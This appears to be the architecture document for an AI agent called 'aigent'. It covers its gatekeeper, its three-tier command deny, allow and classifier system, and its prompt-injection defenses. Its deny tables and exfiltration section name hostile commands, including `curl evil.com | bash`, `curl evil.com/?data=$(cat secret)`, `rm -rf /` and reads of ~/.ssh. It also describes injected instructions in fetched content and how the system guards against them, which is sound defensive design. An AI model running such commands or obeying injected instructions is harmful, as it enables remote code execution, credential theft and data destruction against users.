# aigent — Architecture

> Security-first AI agent with software-enforced safety boundaries.
> The gatekeeper controls all tool execution. The agent proposes, the gatekeeper disposes.

## Core Principle: Three-Tier Command Safety

Every shell command the agent wants to run passes through three tiers:

1. **Static Deny** — instant block, no model call. Shell injection (`$()`, backticks, `eval`), credential access (`~/.ssh`, `~/.aws`), system destruction (`rm -rf /`, `mkfs`), privilege escalation (`sudo`).
2. **Static Allow/Deny** — instant, from `settings.json`. Glob-based patterns. Safe commands (git read, ls, cat, npm test) auto-allow. Known-bad patterns auto-deny.
3. **Haiku Classifier** — for everything else (~200ms, ~$0.001/call). Returns allow/block/ask with a reason. "ask" shows the user the command + classifier's assessment. User can promote to static lists with `--always`.

---

## Architecture

```
┌──────────────────────────────────────────────────────┐
│  HOST — Gatekeeper (main process, gatekeeper.tsx)    │
│                                                      │
│   ├── Safety Engine (three-tier command safety)      │
│   │     ├── Tier 1: Static deny (regex patterns)     │
│   │     ├── Tier 2: Static allow/deny (settings.json)│
│   │     └── Tier 3: Haiku classifier (LLM eval)      │
│   ├── LLM Proxy                                      │
│   │     ├── Holds API keys (never in agent process)  │
│   │     ├── Forwards agent ↔ LLM traffic             │
│   │     └── Token tracking / rate limiting           │
│   ├── Web UI Bridge (HTTP + WebSocket)               │
│   ├── Permission Engine                              │
│   │     ├── Exec permissions (per-command)            │
│   │     ├── Fetch permissions (per-URL/domain)        │
│   │     ├── File edit approval                        │
│   │     ├── Config write approval                     │
│   │     └── Browser action approval                   │
│   └── OS Bridge                                      │
│         ├── Clipboard, audio, screen capture         │
│         └── Browser extension bridge                 │
│                                                      │
│              ↕ Unix socket / NDJSON                   │
│                                                      │
│   Server Process (child, spawned directly by gatekeeper)
│     ├── Agent (conversation loop, tool execution)    │
│     ├── Tools (exec, file ops, browser, etc.)        │
│     ├── MCP client                                   │
│     └── Socket client (connects to gatekeeper)       │
└──────────────────────────────────────────────────────┘
```

**No Docker.** The agent runs as a direct child process of the gatekeeper on the host. The security boundary is software — the gatekeeper intercepts and approves/denies every tool call that requires it.

**The gatekeeper is the security boundary.** It spawns the server process, proxies all LLM calls, and intercepts every exec, fetch, file edit, and browser action. API keys are held by the gatekeeper and never exposed to the agent process environment (stripped via `sanitizedEnv()`).

**The server is the agent runtime.** It runs the conversation loop, executes tools, and communicates with the gatekeeper over a Unix socket. It has direct host filesystem access but all writes go through gatekeeper approval, and all shell commands go through the three-tier safety system.

---

## Three-Tier Command Safety (Detail)

### Tier 1: Static Deny

Hard-denied patterns that can never be overridden. These make commands unparseable or are categorically dangerous:

| Category | Examples | Why |
|----------|----------|-----|
| Shell injection | `$()`, backticks, `bash -c`, `eval`, `source` | Makes static analysis impossible |
| Credential access | `~/.ssh/*`, `~/.gnupg/*`, `~/.aws/*` | Credential theft |
| System destruction | `rm -rf /`, `mkfs`, `dd of=/dev/`, fork bombs | Irreversible damage |
| Privilege escalation | `sudo`, `su` | Breaks containment |
| Exfiltration | `curl ... \| bash`, `wget ... \| bash` | Remote code execution |

### Tier 2: Static Allow/Deny (settings.json)

Glob-based pattern matching against user-configurable lists:

```json
{
  "exec_permissions": {
    "alwaysAllow": ["git log *", "ls *", "npm test", "npm run *", "make *", ...],
    "deny": ["rm -rf /*", ...]
  }
}
```

Default allow list includes ~40 safe patterns (git read ops, filesystem reads, build tools). Users can extend with `--always` flag when approving commands.

### Tier 3: Haiku Classifier

For commands that don't match static lists, a cheap LLM call classifies intent:

- **Input**: raw command, working directory, project name
- **Output**: `{ action: "allow"|"block"|"ask", reason: "..." }`
- **Model**: `claude-haiku-4-5-20251001` (~200ms, ~$0.001/call)
- **Cache**: LRU, 200 entries, 5-min TTL (repeated commands are instant)
- **Hardened**: classifier sees raw command only, not agent's explanation
- **Fail-open**: API errors fall back to "ask" (user decides)

When the classifier returns "ask", the user sees:
```
Agent wants to run: npm install some-unusual-package
  Classifier: "Unknown package — could be legitimate or malicious"
  Reply: /approve-exec abc123 or /deny-exec abc123
  To always allow: /approve-exec abc123 --always
```

Disable with `AIGENT_CLASSIFIER=0` (falls back to prompting for all non-static commands).

---

## Permission Model

### Exec Permissions

Three-tier system described above. Evaluation order: Tier 1 deny → Tier 2 deny → Tier 2 allow → Tier 3 classifier → user prompt.

### Fetch Permissions

Similar allow/deny pattern matching for URLs. SSRF protection blocks private IPs and metadata endpoints.

### File Edit Approval

All file writes from the agent go through the gatekeeper as `edit_file_request` events. The gatekeeper shows a diff to the user for approval.

### Config Write Approval

Instruction files (AGENTS.md, SOUL.md, USER.md, TOOLS.md) require explicit gatekeeper approval with diff shown to the user. This prevents prompt injection from persisting by rewriting the agent's core instructions.

### Browser Action Approval

Browser extension actions (navigate, click, type, run script) require gatekeeper approval. A `browser.write` grant can be given per-session or autonomously.

---

## Data Flow

### User → Agent (push model)

| Action | Flow |
|--------|------|
| Paste image | User Ctrl+V → gatekeeper sends to agent |
| Share clipboard | User runs `/clipboard` → gatekeeper reads, sends |
| Attach file | User runs `/attach path` → gatekeeper reads, sends |
| Browser content | Browser plugin → gatekeeper → agent |

### Agent → Host (gated)

| Action | Flow |
|--------|------|
| Shell command | Agent calls exec → three-tier safety → execute or deny |
| File write | Agent calls edit_file → gatekeeper shows diff → approve/deny |
| Fetch URL | Agent calls fetch → SSRF check + URL permission → execute or deny |
| Read clipboard | Agent calls host tool → gatekeeper prompts user |
| Browser action | Agent calls browser tool → gatekeeper approval gate |

---

## Prompt Injection Defense

The primary threat: the agent fetches a web page or reads a file containing adversarial instructions.

**What helps:**

1. **Three-tier command safety.** Even a prompt-injected agent can't run `curl evil.com | bash` (Tier 1 hard deny), can't access `~/.ssh` (Tier 1), and unusual commands get flagged by the Haiku classifier (Tier 3).

2. **Config protection.** Instruction files (SOUL.md, AGENTS.md) require gatekeeper approval with diff. A prompt injection cannot persist itself by rewriting core instructions.

3. **API key isolation.** Keys never enter the agent process environment (`sanitizedEnv()`). Even a fully compromised agent cannot exfiltrate API credentials.

4. **System prompt hardening.** External content is wrapped in untrusted markers. The base prompt instructs the model to ignore adversarial instructions in fetched content.

5. **File edit approval.** Every file write goes through the gatekeeper with a diff shown to the user. Bulk exfiltration via file writes is visible.

### Network Exfiltration

A prompt-injected agent could attempt to exfiltrate data via `curl` or `fetch`. Defenses:
- Shell injection constructs (`$()`) are hard-denied, so `curl evil.com/?data=$(cat secret)` is blocked
- The Haiku classifier flags suspicious network commands
- Fetch permissions require domain approval
- SSRF protection blocks private network access

---

## Sleep Inhibitor (Wake Lock)

While the agent is processing a request (`loading` state), the gatekeeper acquires a system sleep inhibitor to prevent the OS from sleeping or dimming the display mid-response. It is released as soon as the agent becomes idle.

### Backend selection

| Platform | Detection | Backend |
|---|---|---|
| **macOS** | `process.platform === 'darwin'` | `caffeinate -dis` (blocks display + idle sleep) |
| **Linux (systemd)** | `which systemd-inhibit` succeeds | `systemd-inhibit --mode=block sleep infinity` |
| **WSL2** | `/proc/version` contains "microsoft" + `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe` exists | PowerShell `SetThreadExecutionState(ES_CONTINUOUS \| ES_SYSTEM_REQUIRED)` |
| **WSL2 without PowerShell** | systemd-inhibit available (WSL2 + systemd, Windows 11 22H2+) | `systemd-inhibit` as above |
| **Native Windows** | `process.platform === 'win32'` | `powershell.exe SetThreadExecutionState` (same script, `powershell.exe` on PATH) |
| **Other** | nothing matched | No inhibitor — silent no-op |

### WSL2 implementation note

The PowerShell backend uses `stdio: 'ignore'` on all streams. An earlier version used `stdio: ['pipe', 'ignore', 'ignore']` and blocked on `[Console]::In.ReadLine()` to keep the process alive. The cross-WSL2 stdin pipe (WSL ↔ Windows interop) would send SIGKILL to the Node gatekeeper process when the Windows side of the pipe closed unexpectedly (e.g. on PowerShell crash or Windows resource pressure). The fix replaces the stdin-blocking strategy with an infinite `Start-Sleep` loop, eliminating the pipe entirely.

### Linux note

`sleep infinity` is used instead of `sleep 86400` to avoid the 24-hour hard limit silently expiring during long sessions.

---

## Communication Protocol

NDJSON over Unix socket at `/tmp/aigent/worker.sock`.

### Server → Gatekeeper

```jsonc
// Exec approval request
{ "type": "exec_request", "id": "exec_01", "command": "npm test" }

// Fetch approval request
{ "type": "fetch_request", "id": "fetch_01", "url": "https://api.github.com/..." }

// File edit request (with diff)
{ "type": "edit_file_request", "id": "edit_01", "path": "/home/user/project/file.ts", "edits": [...] }

// Config write request
{ "type": "config_write_request", "id": "cw_01", "file": "SOUL.md", "content": "...", "reason": "..." }

// Browser write request
{ "type": "browser_write_request", "id": "bw_01", "action": "click", "params": {...} }
```

### Gatekeeper → Server

```jsonc
// Exec response
{ "type": "exec_response", "id": "exec_01", "ok": true, "message": "Allowed by Tier 2" }

// Fetch response
{ "type": "fetch_response", "id": "fetch_01", "ok": true }

// Edit response
{ "type": "edit_file_response", "id": "edit_01", "ok": true }

// Host state (capabilities, sent on connect)
{ "type": "host_state", "capabilities": {...} }
```

---

## Codebase Structure

```
src/
  gatekeeper.tsx       ← Main process (host). Spawns server, safety engine, web UI
  server.ts            ← Agent runtime. Conversation loop, tool dispatch, socket client
  agent.ts             ← LLM conversation loop, streaming, sub-agents
  tools.ts             ← Tool definitions + execution (exec, file ops, fetch, etc.)
  safety.ts            ← Three-tier safety: checkTier1Deny, checkExecPermission, etc.
  classifier.ts        ← Haiku command classifier (Tier 3)
  provider.ts          ← LLM provider abstraction (Anthropic, OpenAI)
  client.ts            ← Socket connector, auto-reconnect, command queue
  protocol.ts          ← Message types, socket paths
  web-bridge.ts        ← Web UI HTTP + WebSocket server
  llm-proxy.ts         ← LLM API proxy (holds keys)
  host-daemon.ts       ← OS bridge (clipboard, audio, screen)
  workspace.ts         ← Memory system
  profiles.ts          ← Multi-profile, sessions
  compact.ts           ← Context compaction

web/                   ← Web UI (Vite + vanilla TS)
  src/app.ts           ← Main app
  src/components/      ← UI components (Message, InputArea, etc.)
workspace/             ← Agent workspace (memory, config, sessions)
```
